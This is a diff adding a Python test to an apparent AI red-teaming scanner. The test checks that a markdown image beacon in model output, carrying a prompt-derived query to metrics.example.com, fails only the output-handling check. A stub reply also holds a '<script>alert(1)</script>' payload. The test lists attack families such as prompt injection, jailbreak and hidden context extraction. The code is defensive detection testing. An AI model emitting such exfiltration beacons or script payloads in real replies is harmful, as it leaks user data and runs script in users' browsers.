@@ -1,5 +1,6 @@
 """Built-in AI checks catch real leaks, not only Insidia's own planted strings."""
 
+import hashlib
 import json
 import socket
 import threading
@@ -344,6 +345,91 @@ def test_a_bot_beacon_is_chosen_over_the_echoed_probe_pixel(
         assert item["attack"] == "ai.output_handling_sinks"
         assert "HTML" not in str(item["synopsis"])
     assert any(item["title"] == "Model output carries active HTML" for item in findings)
+
+
+_JUDGE_UNUSED = "this coverage does not call the judge"
+_BEACON_HOST_PATH = "https://metrics.example.com/p.png"
+_PASS_ON_THEIR_OWN_ORACLE = (
+    "ai.data_leakage",
+    "ai.prompt_injection_direct",
+    "ai.jailbreak",
+    "ai.hidden_context_extraction",
+    "ai.unbounded_consumption",
+)
+
+
+def _beacon_query(prompt: str) -> str:
+    """Same host and path on every reply. The query changes with the prompt."""
+    stamp = hashlib.sha256(prompt.encode()).hexdigest()[:12]
+    beacon = f"![x]({_BEACON_HOST_PATH}?q={stamp})"
+    if "<script" in prompt or "onerror" in prompt:
+        return f"<script>alert(1)</script>\n{beacon}"
+    return f"All good.\n{beacon}"
+
+
+def _control_row(benchmark: dict[str, object], family: str) -> dict[str, object]:
+    controls = benchmark["controls"]
+    assert isinstance(controls, list)
+    rows = [row for row in controls if isinstance(row, dict) and row.get("id") == family]
+    assert len(rows) == 1
+    return rows[0]
+
+
+def test_a_beacon_does_not_fail_an_unrelated_family(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A beacon-only reply fails output handling once, and no other AI check."""
+    code, findings = _run(tmp_path, monkeypatch, _beacon_query)
+    assert code == 1
+    assert {str(item["attack"]) for item in findings} == {"ai.output_handling_sinks"}
+    beacons = _markdown(findings)
+    assert len(beacons) == 1
+    beacon = beacons[0]
+    assert beacon["title"] == "Model output carries a markdown beacon"
+    assert beacon["check_id"] == "INS-AI-013"
+    observations = beacon["observations"]
+    assert isinstance(observations, list)
+    urls = {str(item["evidence"]) for item in observations if isinstance(item, dict)}
+    assert len(urls) >= 2
+    assert {url.split("?", 1)[0] for url in urls} == {_BEACON_HOST_PATH}
+
+    runs = tmp_path / ".insidia" / "runs"
+    latest = max(runs.iterdir(), key=lambda path: path.name)
+    benchmark = json.loads((latest / "benchmark.json").read_text())
+    assert isinstance(benchmark, dict)
+    for family in _PASS_ON_THEIR_OWN_ORACLE:
+        assert _control_row(benchmark, family)["result"] == "pass"
+    for family in ("ai.harmful_content_policy", "ai.bias"):
+        row = _control_row(benchmark, family)
+        assert row["result"] == "not tested"
+        assert row["detail"] == _JUDGE_UNUSED
+    assert _control_row(benchmark, "ai.output_handling_sinks")["result"] == "fail"
+
+    sarif = json.loads((latest / "results.sarif").read_text())
+    run = sarif["runs"][0]
+    rules = run["tool"]["driver"]["rules"]
+    results = run["results"]
+    assert isinstance(rules, list) and isinstance(results, list)
+    by_id = {rule["id"]: rule["shortDescription"]["text"] for rule in rules}
+    titles = set(by_id.values())
+    assert "Model output carries a markdown beacon" in titles
+    assert "Model output carries active HTML" in titles
+    beacon_ids = {
+        rule_id
+        for rule_id, title in by_id.items()
+        if title == "Model output carries a markdown beacon"
+    }
+    html_ids = {
+        rule_id for rule_id, title in by_id.items() if title == "Model output carries active HTML"
+    }
+    assert beacon_ids.isdisjoint(html_ids)
+    for result in results:
+        title = by_id[result["ruleId"]]
+        message = result["message"]["text"]
+        if "markdown beacon" in message:
+            assert title == "Model output carries a markdown beacon"
+        if "active HTML" in message:
+            assert title == "Model output carries active HTML"
 
 
 def test_a_spontaneous_beacon_on_other_chat_replies_is_flagged(
